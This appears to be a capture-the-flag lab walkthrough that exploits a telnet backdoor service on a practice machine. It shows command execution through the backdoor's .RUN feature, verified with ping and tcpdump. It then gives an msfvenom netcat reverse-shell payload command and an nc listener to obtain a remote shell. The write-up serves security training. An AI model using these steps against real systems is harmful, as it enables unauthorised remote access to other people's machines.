Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. 
It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.


**Method Breakdown**

So, from our enumeration stage, we know:

    - There is a poorly hidden telnet service running on this machine

    - The service itself is marked "backdoor"

    - We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!


  **"telnet ip port "**

	NOTE: use .HELP after connecting via telnet to target system to check commands syntax

	NOTE: This is how I found out that to run commands you have to type .RUN before and then the actual command

	root@ip-10-10-55-84:~# telnet 10.10.21.149 8012
	Trying 10.10.21.149...
	Connected to 10.10.21.149.
	Escape character is '^]'.
	SKIDY'S BACKDOOR. Type .HELP to view commands
	^]
	telnet> .HELP
	?Invalid command
	telnet> .HELP
	?Invalid command
	telnet> 
	.HELP
	.HELP: View commands
 .RUN <command>: Execute commands
	.EXIT: Exit

	Note: now to run a ping command in telnet session

	.RUN ping 10.10.55.84 -c 5


Start a tcpdump listener on your local machine.
	-   `sudo tcpdump ip proto \\icmp -i eth0`

  
Now, use the command **"ping [local THM ip] -c 1"** through the telnet session to see if we're able to execute system commands.
	yes

Now we know the commend is being executed at target system through telnet

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvp [listening port]"**

we need to copy and paste our msfvenom payload into the telnet session and run it as a command


Now we have a reverse shell in target system
